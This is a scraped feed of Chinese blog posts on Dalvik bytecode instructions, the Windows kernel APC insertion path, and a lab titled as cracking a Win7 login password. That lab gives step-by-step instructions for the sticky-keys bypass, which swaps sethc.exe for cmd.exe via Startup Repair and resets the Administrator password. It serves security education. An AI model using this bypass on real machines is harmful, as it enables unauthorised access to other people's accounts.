//为对象赋值，源寄存器是16位的，目的寄存器是8位的move-object/16 vAAAA, vBBBB //为对象赋值，源寄存器与目的寄存器都是16位的move-result vAA //将上一个invoke类型指令操作的单字非对象结果赋予vAA寄存器move-result-wide vAA //将上一个invoke类型指令操作的双字非对象结果赋予vAA寄存器move-result-object vAA //将上一个invoke类型指令操作的对象结果赋予vAA寄存器move-exception vAA //将一个在运行时发生的异常保存到vAA寄存器中；这条指令必须在异常发生时由异常处理器使 //用，否则指令无效 返回指令Code12345678指令：return作用：作为函数结束时运行的最后一条指令示例：return-void //表示函数从一个void方法返回retutn vAA //表示函数返回一个32位非对象类型的值，返回值为8位寄存器vAAreturn-wide vAA //表示函数返回一个64位非对象类型的值，返回值为8位寄存器对vAAreturn-object vAA //表示函数返回一个对象类型的值，返回值为8位寄存器vAA 数据定义指令Code1234567891011121314151617指令：const作用：用于定义程序中用到的常量、字符串、类等数据示例：const/4 vA, #+B //将数值符号扩展为32位后赋予寄存器vAconst/16 vAA, #+BBBB //将数值符号扩展为32位后赋予寄存器vAAconst vAA, #+BBBBBBBB //将数值赋予寄存器vAAconst/high16 vAA, #+BBBB0000 //将数值右边的0扩展为32位后赋予寄存器vAAconst-wide/16 vAA, #+BBBB //将数值符号扩展为64位后赋予寄存器对vAAconst-wide/32 vAA, #+BBBBBBBB //将数值符号扩展为64位后赋予寄存器对vAAconst-wide vAA, #+BBBBBBBBBBBBBBBB //将数值赋予寄存器对vAAconst-wide/high16, #+BBBB000000000000 //将数值右边的0扩展为64位后赋予寄存器对vAAconst-string vAA, string@BBBB //通过字符串索引构造一个字符串，并将其赋予寄存器vAAconst-string/jumbo vAA, string@BBBBBBBB //通过字符串索引（较大）构造一个字符串，并将其赋予寄存器vAAconst-class vAA, type@BBBB //通过类型索引获取一个类引用，并将其赋予寄存器vAAconst-class/jumbo vAAAA, type@BBBBBBBB //通过给定的类型索引一个类引用，并将其赋予寄存器vAAAA。这条指令占用2字节 //，值为0x00ff（Android4.0新增指令） 锁指令Code123456指令：monitor作用：用于多线程程序对同一对象操作示例：monitor-enter vAA //为指定对象获取锁monitor-exit vAA //释放指定对象的锁 实例操作指令Code1234567891011121314作用：用于对实例的类型转换，检查及创建示例：check-cast vAA, type@BBBB //将vAA寄存器中的对象引用转换成指定的类型，若失败会抛出 //ClassCaseException异常。若类型B指定的是基本类型，则对非基本 //类型的类型A来说，运行将会失败check-cast/jumbo vAAAA, type@BBBBBBBB //功能与上一条指令相同，加上字节码后缀jumbo后，寄存器与指令索引 //的取值范围更大（Android4.0新增）instance-of vA, vB, type@CCCC //判断vB寄存器中的对象引用是否可以转换成指定的类型，如果可以就为 //vA寄存器赋值1，否则为vA寄存器赋值0instance-of/jumbo vAAAA, vBBBB, type@CCCCCCCC //功能同上一条指令，寄存器与指令索引的取值范围更大new-instance vAA, type@BBBB //构造一个指定类型对象的新实例，并将对象引用赋值给vAA寄存器。类型 //符type指定的类型不能是数组类new-instance/jumbo vAAAA, type@BBBBBBBB //功能同上一条指令，寄存器与指令索引的取值范围更大 数组操作指令Code12345678910111213141516171819202122232425作用：获取数组长度，新建数组，数组赋值，数组元素取值与赋值等示例：array-length vA, vB //获取给定vB寄存器中数组的长度，并将值赋予vA寄存器。new-array vA, vB, type@CCCC //构造指定类型(type@CCCC)和大小(vB)的数组，并将值赋予vA寄存器new-array/jumbo vAAAA, vBBBB, type@CCCCCCCC //功能同上一条指令，寄存器与指令索引的取值范围更大filled-new-array {vC, vD, vE, vF, vG}, type@BBBB//构造指定类型(type@BBBB)和大小(vA)的数组并填充数组内容。vA寄存 //器是隐含使用的，除了指定数组的大小，还指定了参数的个数。vC~vG //是所使用的参数寄存器序列filled-new-array/range {vCCCC ... vNNNN}, type@BBBB //功能与上一条指令相同，参数寄存器使用range字节码后缀来指定取 //值范围。vC是第1个参数寄存器，N=A+C-1filled-new-array/jumbo {vCCCC ... vNNNN}, type@BBBBBBBB //功能同上一条指令，指令索引的取值范围更大（注意这里寄存器取值范 //围不变）fill-array-data vAA, +BBBBBBBB //用指定的数据来填充数组，vAA寄存器为数组引用(引用的必须是基础类 //型的数组)，在指令后面会紧跟一个数据表。arrayop vAA, vBB, vCC //指令用于对vBB寄存器指定的数组元素进行取值和赋值。vCC寄存器用于 //指定数组元素的索引。vAA寄存器用于存放读取的或需要设置的数组元 //素的值。读取元素时使用aget类指令，为元素赋值时使用aput类指令 //根据数组中存储的类型指令的不同，在指令后面会紧跟不同的指令后缀 //指令包括：aget、aget-wide、aget-object、aget-boolean、 //aget-byte、aget-char、aget-short、aput、aput-wide、 //aput-object、aput-boolean、aput-byte、aput-char、 //aput-short 异常指令Code12345指令：throw作用：用于抛出异常示例：throw vAA //抛出vAA寄存器中指定类型的异常 跳转指令Code1234567891011121314151617181920212223242526272829指令：goto、switch、if作用：从当前地址跳转到指定的偏移处示例：goto +AA //无条件跳转到指定偏移处，偏移量AA不能为0goto/16 +AAAA //无条件跳转到指定偏移处，偏移量AAAA不能为0goto/32 +AAAAAAAA //无条件跳转到指定偏移处packed-switch vAA, +BBBBBBBB //分支跳转指令，vAA寄存器为switch分支中需要判断的值，BBBBBBBB指 //向一个 packed-switch-payload 格式的偏移表，表中的值是递增的 //偏移量sparse-switch vAA, +BBBBBBBB //分支跳转指令，vAA寄存器为switch分支中需要判断的值，BBBBBBBB指 //向一个 sparse-switch-payload 格式的偏移表，表中的值是无规律 //的偏移量if-test vA, vB, +CCCC //条件跳转指令用于比较vA寄存器与vB寄存器的值。如果条件满足，就跳 //转到CCCC指定的偏移处，偏移量CCCC不能为0if-testz vAA, +BBBB //条件跳转指令将vAA寄存器的值与0进行比较。如果条件满足，就跳转到 //BBBB指定的偏移处，偏移量BBBB不能为0if-eq //if(vA == vB)if-ne //if(vA != vB)if-lt //if(vA < vB)if-le //if(vA = vB)if-gt //if(vA > vB)if-eqz //if(!vAA)if-nez //if(vAA)if-ltz //if(vAA < 0)if-lez //if(vAA 0)if-gez //if(vAA >= 0) 比较指令Code1234567891011121314151617181920212223242526指令：cmp作用：对两个寄存器的值（浮点型或长整型）进行比较格式：cmpkind vAA, vBB, vCC说明: vBB与vCC是需要比较的两个寄存器或寄存器对，比较的结果放到vAA寄存器中示例：cmpl-float //比较两个单精度浮点数:（float比较的是寄存器） // vBB > vCC, vAA = -1 // vBB == vCC, vAA = 0 // vBB < vCC, vAA = 1cmpg-float //比较两个单精度浮点数： // vBB > vCC, vAA = 1 // vBB == vCC, vAA = 0 // vBB < vCC, vAA = -1cmp1-double //比较两个双精度浮点数：（double比较的是寄存器对） // vBB > vCC, vAA = -1 // vBB == vCC, vAA = 0 // vBB < vCC, vAA = 1cmpg-double //比较两个双精度浮点数： // vBB > vCC, vAA = 1 // vBB == vCC, vAA = 0 // vBB < vCC, vAA = -1cmp-long //比较两个长整型数：（long比较的是寄存器） // vBB > vCC, vAA = 1 // vBB == vCC, vAA = 0 // vBB < vCC, vAA = -1 字段操作指令Code123456789101112指令：get/put作用： 用于对对象实例的字段进行读写操作，字段类型可以是Java中有效的数据类型普通字段指令集： iinstanceop vA, vB, field@CCCC 静态字段指令集： sstaticop vAA, field@BBBB普通字段指令前缀： i，例如，普通字段，读操作用iget指令，写操作用iput指令静态字段指令前缀： s，例如，静态字段，读操作用sget指令，写操作用sput指令普通字段操作指令： iget、iget-wide、iget-object、iget-boolean、iget-byte、iget-char、iget-short、iput 、iput-wide、iput-object、iput-boolean、iput-byte、iput-char、iput-short静态字段操作指令： sget、sget-wide、sget-object、sget-boolean、sget-byte、sget-char、sget-short、sput 、sput-wide、sput-object、sput-boolean、sput-byte、sput-char、sput-shortAndroid4.0新增指令集： iinstanceop/jumbo vAAAA, vBBBB, field@CCCCCCCC， sstaticop/jumbo vAAAA, field@BBBBBBBB 方法调用指令Code1234567891011121314151617指令：invoke作用：负责调用类实例的方法指令类型: 1.不使用range指定寄存器的范围： invoke-kind {vC, vD, vE, vF, vG}, meth@BBBB 2.使用range指定寄存器的范围： invoke-kind/range {vCCCC .. vNNNN}, meth@BBBB 3.Android4.0新增大范围寄存器与指令索引： invoke-kind/jumbo {vCCCC .. vNNNN}, meth@BBBB示例：invoke-virtual或invoke-virtual/range //用于调用实例的虚方法invoke-super或invoke-super/range //用于调用实例的父类方法invoke-direct或invoke-direct/range //用于调用实例的直接方法invoke-static或invoke-static/range //用于调用实例的静态方法invoke-interface或invoke-interface/range //用于调用实例的接口方法返回值获取(move-result*)：invoke-static {}, Landroid/os/Parcel;->obtain()Landroid/os/Parcel;move-result-object v0 数据转换指令Code123456789101112131415161718192021222324252627格式：unop vA, vB作用:将一种基本类型的数值转换成另一种基本类型的数值vB：存放需要转换的数据的寄存器(对)vA：存放转换结果的寄存器(对)示例：neg-int //对整型数求补not-int //对整型数求反neg-long //对长整型数求补not-long //对长整型数求反neg-float //对单精度浮点数求补neg-double //对双精度浮点数求补int-to-byte //整型->字节int-to-char //整型->字符串int-to--short //整型->短整型int-to-long //整型数->长整型数int-to-float //整型数->单精度浮点数int-to-double //整型数->双精度浮点数long-to-int //长整型数->整型数long-to-float //长整型数->单精度浮点数long-to-double //长整型数->双精度浮点数float-to-int //单精度浮点数->整型数float-to-long //单精度浮点数->长整型数float-to-double //单精度浮点数->双精度浮点数double-to-int //双精度浮点数->整型数double-to-long //双精度浮点数->长整型数double-to-float //双精度浮点数->单精度浮点数 数据运算指令Code12345678910111213141516171819202122232425类型：算数运算、逻辑运算作用：进行数值间的加、减、乘、除、模、移位、与、或、非、异或数据运算指令4种类型：binop vAA, vBB, vCC //将vBB寄存器与vCC寄存器进行运算，结果保存到vAA寄存器中binop/2addr vA, vB //将vA寄存器与vB寄存器进行运算，结果保存到vA寄存器中binop/lit16 vA, vB, #+CCCC //将vB寄存器与常量CCCC进行运算，结果保存到vA寄存器中binop/lit8 vAA, vBB, #+CC //将vBB寄存器与常量CC进行运算，结果保存到vAA寄存器中指令后缀：1. 后3类指令比第1类指令多出了指令后缀，在binop相同的情况下，执行的运算是类似的2. 第1类指令会根据数据类型的不同，增加不同的后缀，例如-int和-long第1类指令归类：add-type //vBB + vCCsub-type //vBB - vCCmul-type //vBB * vCCdiv-type //vBB / vCCrem-type //vBB % vCCand-type //vBB AND vCCor-type //vBB OR vCCxor-type //vBB XOR vCCshl-type //vBB(有符号数) < vCC> vCCushr-type //vBB(有符号数) >> vCC 参考资料参考书籍：《Android软件安全权威指南》—— 丰生强 参考链接： https://blog.csdn.net/zlmm741/article/details/104566842 （CSDN-zlmm741学习笔记）","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"http://cata1oc.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"APC挂入过程","slug":"APC挂入过程","date":"2020-07-19T13:24:51.000Z","updated":"2022-05-17T15:12:59.217Z","comments":true,"path":"2020/07/19/APC挂入过程/","link":"","permalink":"http://cata1oc.github.io/2020/07/19/APC%E6%8C%82%E5%85%A5%E8%BF%87%E7%A8%8B/","excerpt":"","text":"前言之前的文章中了解了什么是APC以及与之相关的备用APC队列，本篇来着重分析一下APC的挂入过程，为后期学习APC的执行过程打下基础。 _KAPC结构在分析APC挂入过程之前，需要先了解一下_KAPC这个结构。每当要挂入一个APC函数时，不管是内核APC还是用户APC，内核都要准备一个KAPC的数据结构，并且将这个KAPC结构挂到相应的APC队列中。 下面来看一下KAPC结构的各个字段及含义： Code12345678910111213141516kd> dt _kapcnt!_KAPC +0x000 Type //类型APC类型为0x12 +0x002 Size //本结构体的大小0x30 +0x004 Spare0 //未使用 +0x008 Thread //目标线程 +0x00c ApcListEntry //APC队列挂的位置 +0x014 KernelRoutine //指向一个函数(调用ExFreePoolWithTag释放APC) +0x018 RundownRoutine //未使用 +0x01c NormalRoutine //用户APC总入口或者真正的内核apc函数 +0x020 NormalContext //内核APC: NULL用户APC:真正的APC函数 +0x024 SystemArgument1 //APC函数的参数 +0x028 SystemArgument2 //APC函数的参数 +0x02c ApcStateIndex //挂哪个队列, 有四个值: 0 1 2 3 +0x02d ApcMode //内核APC:0 用户APC:1 +0x02e Inserted //表示本apc是否已挂入队列, 挂入前:0 挂入后1 +0x000 Type在Windows下任何一种内核对象都有一个类型编号，该字段指明APC对象的类型为0x12。 +0x002 Size该结构体（_KAPC）的大小为0x30。 +0x00C ApcListEntryAPC所插入的队列，根据类型（内核/用户Apc）的不同，插入的队列也不同。这个字段表示的队列与KTHREAD(Kapc.Thread).ApcState.ApcListHead其中的一个队列相同。 +0x014 KernelRoutine该字段指向一个函数，在APC执行完毕后，完成释放本结构内存的操作。 +0x01C NormalRoutine该字段与NormalContext字段都要分情况讨论，下面来看。 如果当前是内核APC：通过该字段可以找到内核APC函数（这是海哥分析的结论，我分析时发现内核APC时，该值似乎为空） 如果当前是用户APC：则表示的是用户APC的总入口（这个是海哥分析的，我分析时，发现用户APC时，该处的值会赋给NormalContext） +0x020 NormalContext 如果当前是内核APC：该值为空。 如果当前是用户APC：该值执行用户APC函数（我分析时，用户APC时，该值由NormalRoutine传递而来） +0x02C ApcStateIndex该字段非常重要，其名称与KTHREAD+0x165处相同，但是含义不同，包含了4个值（0，1，2，3）。下面来着重分析这个字段。 值为0：原始环境 值为1：挂靠环境 先来分析值为0和1的情况，在前面备用APC队列一篇中提到过如下定理： Code123456正常情况下： ApcStatePointer[0] 指向 ApcState ApcStatePointer[1] 指向 SavedApcState挂靠情况下： ApcStatePointer[0] 指向 SavedApcState ApcStatePointer[1] 指向 ApcState 因此，当ApcStateIndex值为0时，无论正常情况下，还是挂靠情况下，都是指向原来的APC队列中；同样，当ApcStateIndex值为1时，正常情况下指向备用队列，挂靠情况下指向挂靠进程的APC队列。 值为2：当前环境 值为3：插入APC时的当前环境 上面两个值还是比较好理解的，那么这个2和3究竟是怎么来的呢？目前还不是很好解释这两个值，需要进一步分析APC挂入的代码。 QueueUserApc(kernel32.dll)早先在介绍APC本质的时候提到过，通过3环的QueueUserApc函数可以完成将APC插入到队列的操作，那么我们就来逐步深入探索这一完整的过程。 由图，QueueUserApc函数内部并没有做任何实现，而是调用了外部的NtQueueApcThread函数。按照惯例，去导入表找，发现NtQueueApcThread属于ntdll.dll NtQueueApcThread(ntdll.dll)进入ntdll.dll，定位到NtQueueApcThread，同样发现在NtQueueApcThread中并没有对函数的实现，并给出了一个系统服务号：0xB4。 有了这个系统服务号，我们去系统服务表里面查，就可以看到QueueUserApc在内核中的实现叫做NtQueueApcThread，该函数与ntdll.dll中的函数同名，但是实现并不相同，需要进入内核文件继续作分析。 由于本次实验基于10-10-12分页下的WindowsXP系统，所以选用的内核文件是ntoskrnl.exe NtQueueApcThread(ntoskrnl.exe)将ntoskrnl.exe拖入IDA中，定位到NtQueueApcThread的位置，进行观察。 可以发现，在内核中的NtQueueApcThread函数中同样没有做太多的事，仅做了一些判断，传参，调用了一些函数。值得留意的是，在NtQueueApcThread调用的函数中，有两个函数比较关键，其函数名都涉及到了Apc，分别是KeInitializeApc和KeInsertQueueApc。接下来我们进一步分析这两个函数。先从KeInitializeApc开始。 KeInitializeApc(ntoskrnl.exe)由函数名可以猜到，该函数是用来初始化Apc的，具体是如何操作的呢？我们先来看一下函数原型： c1234567891011void KeInitializeApc( IN PKAPC Apc, //KAPC指针 (指向一块分配好的内存，但还没初始化) IN PKTHREAD Thread, //目标线程 IN KAPC_ENVIRONMENT TargetEnvironment, //0 1 2 3四种状态 IN PKKERNEL_ROUTINE KernelRoutine //销毁KAPC的函数地址 IN PKRUNDOWN_ROUTINE RundownRoutine OPTIONAL //未使用 IN PKNORMAL_ROUTINE NormalRoutine, //用户APC总入口或者内核apc函数 IN KPROCESSOR_MODE Mode, //要插入用户apc队列还是内核apc队列 IN PVOID Context //内核APC:NULL 用户APC:真正的APC函数) 函数原型并不复杂，传递的每个参数，都是用来给Kapc结构赋值用的。实际上KeInitializeApc本身的作用，就是用这些传入的参数给Kapc结构赋值，构造并初始化一个Apc块。 尽管KeInitializeApc本身的功能比较好理解，但是有一个字段的赋值，非常重要，就是对Kapc.ApcStateIndex的赋值。下面观察汇编代码： 前面提到了，Kapc.ApcStateIndex有4个值：0，1，2，3。0和1很好理解，这里就解释了为什么会有2这个值。首先这里会将传入的environment参数的值与2作比较，这个2有什么含义呢？这个2指的就是当前系统在执行这行指令时所处的环境。因为不确定此时的环境和先前的环境是否一致（可能发生挂靠），所以这里会进行判断，如果environment值为2，那么接下来会跳转到另一处代码，将当前线程的ApcStateIndex(KTHREAD+0x165)，赋值给dl，并在之后的代码将dl赋值给Kapc.ApcStateIndex。这里，就是确保，在初始化Apc时，一定是在线程当前环境下。若值不为2，那么就和之前一样了，值为0或者1，直接赋值给Kapc.ApcStateIndex，使用先前环境的ApcStateIndex。说明线程没有发生挂靠等操作。这也就解释了，为什么Kapc.ApcStateIndex会有2这个取值。至于3何是用到，会在之后再提到。 其余部分就比较好理解，主要是通过传入的参数对Apc进行初始化的操作，并区别内核Apc和用户Apc的初始化，其中有一部分，在我分析时发现，用户Apc的函数实际上是由NormalRoutine初始化的，海哥分析的结果NormalRoutine是用户APC的总入口。这里还是有点出入的，我在这部分的分析可以参考下图。 其余部分的分析可以参考图中注解，不再赘述。 KeInsertQueueApc接着来看KeInsertQueueApc函数，还是先看函数原型： c1234567BOOLEAN NTAPI KeInsertQueueApc( IN PKAPC Apc, //KAPC指针(指向一个已经经过初始化的APC块，未初始化完成) IN PVOID SystemArgument1, //参数1 IN PVOID SystemArgument2, //参数2 IN KPRIORITY PriorityBoost //这个参数又被称作Increment，但是好像也没用到); 然后再来看代码： 首先可以看到一个很明显的用自旋锁上锁和解锁的函数，以确保在插入Apc时不会受到其它核的影响。然后有一个判断，根据Kapc中记录的目标线程（Kapc.Thead），访问线程结构体的ApcQueueable字段（KTHREAD+0xE8），判断目标线程是否允许像该线程的Apc队列中插入Apc。若不允许，直接跳转出去，插入失败。如果允许，则会接着用KeInsertQueueApc函数的参数去初始化Apc块的剩余字段，并调用KiInsertQueueApc函数，这个KiInsertQueueApc则是Apc插入过程的重中之重，接下来着重分析该函数。 KiInsertQueueApc还是先看函数原型，KiInsertQueueApc和KeInsertQueueApc相差不大，只是少俩参数，被用来初始化Apc了，此时Apc也已初始化完成。 c12345BOOLEAN NTAPI KeInsertQueueApc( IN PKAPC Apc, //KAPC指针(指向一个已经初始化完成的APC块) IN KPRIORITY PriorityBoost //同KeInsertQueueApc); 由于KiInsertQueueApc逻辑比较复杂，跳转也比较多，这里就分为3个部分来分析，先来看第一部分。 Part1：校验ApcStateIndex首先来看划分出第一部分的代码： 这里做了两个判断，分别来看； 第一个判断比较Kapc.Inserted字段的值，如果该字段值不等于0，说明该Apc已经被挂入到队列中，此时将会进行跳转，跳转后就直接return了。 第二个判断就非常重要了，它做了一个判断Kapc.ApcStateIndex的值是否等于3，注意，这里出现了该字段的第4个值：3。前面提到过，该字段可以取值（0，1，2，3），前3个取值都已经作过分析，这里出现了第4个取值。这个3代表的就是在插入Apc时的环境（执行KiInsertQueueApc时的环境），这时，在插入Apc之前，会再做最后一次判断，此时的环境发生变化没有（即是否发生线程挂靠等行为），有人可能会好奇，在执行KiInsertQueueApc不是已经上了自旋锁了吗？但是在上锁之前，Apc初始化之后，环境还是可能会发生变化，所以这里会再进行一次判断。由于在初始化时，就已经确定了目标线程。因此这里的操作和KeInitializeApc中一样，将KTHREAD.ApcStateIndex赋值给Kapc.ApcStateIndex。完成插入Apc前最后一次对ApcStateIndex的校验。 Part2：将内核/用户Apc挂入到相应队列 观察这部分代码，执行的流程已经在图中注明，每条指令的具体含义可以参考批注，这里做简要梳理一下这部分的执行流程。 先看红色框住的部分，这里作了判断，Kapc.NormalRoutine是否有值，若不为0，则会跳转。跳转到橙色框住的部分，这里又做了一个判断，判断dl的值，也就是先前传入的Kapc.ApcNode的值是否为0。若等于0，也就该Apc是内核Apc，此时会跳转至棕色框住的代码，这部分做的事情就是把Kapc结构挂到对应的队列中（Kapc.ApcListEntry）。最后跳转回KiInsertQueueApc主体代码中。在前面，若dl的值不等于0，则会判断该Apc函数是不是PsExitSpecialApc；如果是，则会把PsExitSpecialApc对应的Apc块挂入到对应的队列中，之后跳转回主程序。如果再之前没有跳转，即Kapc.NormalRoutine的值为0的情况，就直接将当前Apc挂入到对应的队列中。 所以这部分，主要做的就是对Apc进行挂入的操作，至于内核与用户Apc挂入的区别，将会在后续处理上有所不同，接着来看第三部分。 Part3：唤醒线程的条件 在Part2中完成了Apc块的插入后，在这部分，会将Kapc.Inserted的值置1，表明该Apc已经插入到队列中。然后这里会有一个判断，判断Kapc.ApcStateIndex的值与KTHREAD.ApcStateIndex的值是否相同。若不同，说明挂入Apc时出现问题，给al置1后，函数直接返回。如果相同，接着来看，会先根据Kapc.ApcMode的值判断该Apc为用户Apc还是内核Apc。若是用户Apc，则会跳转并依次判断KTHREAD.State，KTHREAD.WaitMode以及KTHREAD.Alertable的值，其含义分别为判断线程状态是否为等待，判断是否是用户导致的等待以及判断是否可以吵醒线程，若以上条件均满足，则会执行KiUnwaitThread函数，将当前线程从等待链表里取出，挂到就绪链表中，也就是把当前线程唤醒，遂有机会执行Apc函数。若条件不满足，那么Apc函数就无法得到执行。当然还有一种情况，如果当前Apc因条件不满足而没法执行，但是它已经位于Apc队列中，如果下一个Apc插入时，满足唤醒线程的条件的，有可能就两个Apc依次得到执行。内核Apc与用户Apc类似，但是不需要判断这么多，并且内核Apc在执行前会先将KapcState结构中KernelApcPending置1，表示有等待执行的内核Apc，并调用KiUnwaitThread函数唤醒线程。用户Apc只有在满足3个执行条件后，才会修改KapcState结构中的UserApcPending的值，将其置1。 小结至此，Apc挂入过程的函数已全部分析完成，可以总结出如下执行流程（海哥的图） 这其中的每个函数，在本文中均有分析，可以结合图中IDA上的批注一起看。目前已经对APC挂入过程有所了解，后面将会分别分析内核APC与用户APC的执行流程，也是APC专题的核心内容。 参考链接 https://www.bilibili.com/video/BV1NJ411M7aE?p=71 （滴水预习班-APC挂入过程） https://blog.csdn.net/qq_41988448/article/details/104240902 （CSDN-lzyddf笔记） https://blog.csdn.net/qq_38474570/article/details/104326170 （CSDN-鬼手笔记） https://blog.csdn.net/weixin_42052102/article/details/83310341 （CSDN-My classmates笔记）","categories":[],"tags":[{"name":"Windows内核","slug":"Windows内核","permalink":"http://cata1oc.github.io/tags/Windows%E5%86%85%E6%A0%B8/"}]},{"title":"网路安全基础03(实验)：破解Win7登录密码","slug":"网路安全基础03-实验","date":"2020-06-29T05:51:00.000Z","updated":"2022-05-17T15:12:09.830Z","comments":true,"path":"2020/06/29/网路安全基础03-实验/","link":"","permalink":"http://cata1oc.github.io/2020/06/29/%E7%BD%91%E8%B7%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8003-%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"实验环境 虚拟机：VMware Workstation 15.5pro 操作系统：Windows7 SP1 漏洞 5次shift漏洞：在未登录界面可以通过连按5次shift，会弹出一个粘滞键程序。 这个粘滞键程序位于 C:\\Windows\\System32\\sethc.exe 部分win7及win10系统在未进入系统时，可以通过系统修复漏洞篡改系统文件名。这部分在演示中呈现。 准备工作由于Win7默认是不开启Administrator用户的，但是普通用户权限又经常出问题，所以得先把Administrator用户给解禁了。 第一步，右键计算机 -> 管理 -> 系统工具 -> 本地用户和组 -> 用户，找到Administrator用户 第二步，右键Administrator用户 - > 属性，把账户已禁用那个勾去掉，这样就可以使用Administrator用户了 第三步，切换到Administrator用户，进入命令行（此时默认是管理员模式，即拥有全部权限），给Administrator用户修改一个很复杂的密码。 由于密码过于复杂，很快就忘记了，这下我们注销用户再登录就进不去了 于是，现在就到了我们破解密码的时刻了！ 密码破解过程 第一步，先重启Win7，到下面这个界面时，把电源拔了！虚拟机该怎么拔电源呢？点击左上角那个插就可以了。 再次开机，当进入下面这个界面时，选择“启动启动修复”。 接着会问你是否系统还原，选择“取消”。 接下来便是漫长的等待（约10分钟） ……10分钟过去了，终于到了我们要的界面，在这里，我们选择“查看问题详细信息” 往下拉，发现这里竟然有个txt文件，打开它 左上角菜单 -> 文件 -> 打开（选择另存为也行，原理一样） 然后我们进入到了资源管理器的界面！ 接下来的步骤，就很好理解了，先切换到 C:\\Windows\\System32 文件夹下，没错，就是sethc.exe所在的文件夹，同时把下面的文件类型改成“所有文件”，这样我们就可以找到sethc.exe了。 找到sethc.exe，重命名，随便起一个名就行。 然后我们再往上找，发现了不得了的东西！cmd.exe也在这个目录下！！！这下你们知道该做啥了吧。把cmd.exe重命名为 sethc.exe ，这样下次我们再按5次shift的时候，打开的就不是粘滞键程序，而是cmd了！（注：这里要先给cmd备份一个，不然系统就无法找到真正的cmd了） 完成上述操作后，关闭记事本，重启Win7，在登录界面连按5次shift，跳出来的不是粘滞键程序，而是命令行！这是我们执行 dos1net user Administrator 密码 就可以成功修改密码并登入系统了！ 参考链接 https://www.bilibili.com/video/BV1i7411G7vm?p=18 (千峰开源网络安全教程p18) https://blog.csdn.net/weixin_43252204/article/details/105486061 (Beglage_buglige的学习笔记)","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"Dalvik语言基础","slug":"Dalvik语言基础","date":"2020-06-22T08:41:21.000Z","updated":"2022-05-17T15:11:38.955Z","comments":true,"path":"2020/06/22/Dalvik语言基础/","link":"","permalink":"http://cata1oc.github.io/2020/06/22/Dalvik%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/","excerpt":"","text":"前言Dalvik虚拟机有专门的指令集及专门的指令格式（Dalvik Executable Format）和调用规范。由Dalvik指令集组成的代码称为Dalvik汇编代码，由这种代码表示的语言称为Dalvik汇编语言。 Dalvik汇编语言拥有专门的机器模型和类似于C语言的调用约定，并有一套完整的设计准则，具体设计准则可以参考官方文档。 Dalvik可执行指令格式在学习Dalvik可执行指令格式之前，先要对格式有个大致的了解，这里截取了格式表的一部分。 根据格式表可以发现，Dalvik可执行指令的格式由两个因素决定，指令的位描述（布局）和指令格式标识（符）。 指令的位描述位描述约定如下： 由一个或多个空格分隔的”单词“组成，每个单词描述一个16位代码单元。 每个字母表示4位，按照从高位到低位的顺序进行排列，并使用”|“分隔以便于用户分辨。 A~Z表示格式中的字段，这些字段随后由语法列做进一步定义。 ”op“表示8位的操作码。 “Ø”表示所有在指示位置的位必须为零。 例如，”B|A|op CCCC“格式表示其包含两个16位代码单元。第一个指令字的高8位是两个4位值，低8位是操作码；第二个指令字是一个16位的值。 指令格式标识指令格式标识，又称为格式ID，位于格式表的第二列，用于在其它文档和代码中识别该格式。 大多数格式ID包含三个字符，前两个的十进制数，最后一个是字母： 第1个十进制数表示指令是由多少个16位的字组成的。 第2个十进制数表示指令所含寄存器的数量上限（某些格式使用的寄存器数量是可变的），特殊标记“r”用于标识所使用的寄存器的范围。 第3个字符为类型码，表示指令所使用的额外数据的类型，参考下表。 助记符 位数 含义 b 8 8位有符号立即数 c 16、32 常量池索引 f 16 接口常量（仅对静态链接格式有效） h 16 有符号立即数 hat（32位或64位值的高阶位，低阶位全为0） i 32 有符号立即数（整型）或32位浮点数 l 64 有符号立即数（长整型）或64位双精度浮点数 m 16 方法常量（仅对静态链接格式有效） n 4 有符号立即数（半字节） s 16 有符号立即数（短整型） t 8、16、32 跳转，分支 x 0 无额外数据 一种特殊的情况是指令的末尾多出一个字母。如果是字母s，表示指令采用静态链接；如果是字母i，表示指采用内联链接。如果是其它格式（例如“20bc”），表示包含两个数据块。 以指令格式标识“22x”为例，第1个数字2表示指令由两个16位字组成，第2个数字2表示指令使用两个寄存器，字母x表示没有使用额外的数据。 Dalvik指令语法格式表的第三列指出了指令中所使用的人类可识别的语法。约定如下： 每条指令以命名的操作码开始，后面可选择使用一个或多个参数，并且参数之间用逗号分隔。 如果一个参数对应第一列（位描述）中的一个字段，相应字段的字母将出现在语法中，每个字母代表字段中的四位。 如果参数采用“vX“的形式表示，说明它是一个寄存器，例如 v0、v1 等。这里用“v”而不用“r”的目的是避免与基于该虚拟机架构本身的寄存器产生命名冲突（例如，ARM架构的寄存器名称以”r“开头） 如果参数采用“#+X“的形式表示，说明它是一个常量。 如果参数采用“+X”的形式表示，说明它是一个相对指令的地址偏移量。 如果参数所采用的形式为“kind@X”，说明它是一个常量池索引值。其中“kind”表示所引用的常量池的种类，可以是“string”（字符串池索引）、“type”（类型池索引）、“field”（字段池索引）、“meth”（方法池索引）和“site”（调用点索引）。 如果格式值并非明确地包含在语法中，而是选择使用某种变体，则每个变体都以“[X=N]”（例如：“[A=2]”）为前缀来表示对应关系。 以指令 op vAA, string@BBBB 为例，该指令使用了一个寄存器参数 vAA， 附加了一个字符串常量池索引值 string@BBBB。 DEX反汇编工具主流的DEX文件反汇编工具有Android官方的dexdump和第三方的baksmali，两者在语法上略有差异。以前一篇代码中的foo()函数进行分析。 使用dexdump进行反汇编： smali12345678$ dexdump -d Hello.dex...|[000198] Hello.foo:(II)I|0000: add-int v0, v3, v4|0002: sub-int v1, v3, v4|0004: mul-int/2addr v0, v1|0005: return v0... 使用baksmali进行反汇编： smali12345678910111213141516...# virtual methods.method public foo(II)I .registers 5 .prologue .line 3 add-int v0, p1, p2 sub-int v1, p1, p2 mul-int/2addr v0, v1 return v0.end method... 这两种反汇编代码的结构大致相同，方法名、字段类型和代码指令序列一致。差异仅仅在于dexdump使用的都是“v”开头的寄存器，baksmali同时使用“v”和“p”开头的寄存器。baksmali使用的是p命名法，dexdump使用的是v命名法。其中baksmali要更为主流一些。 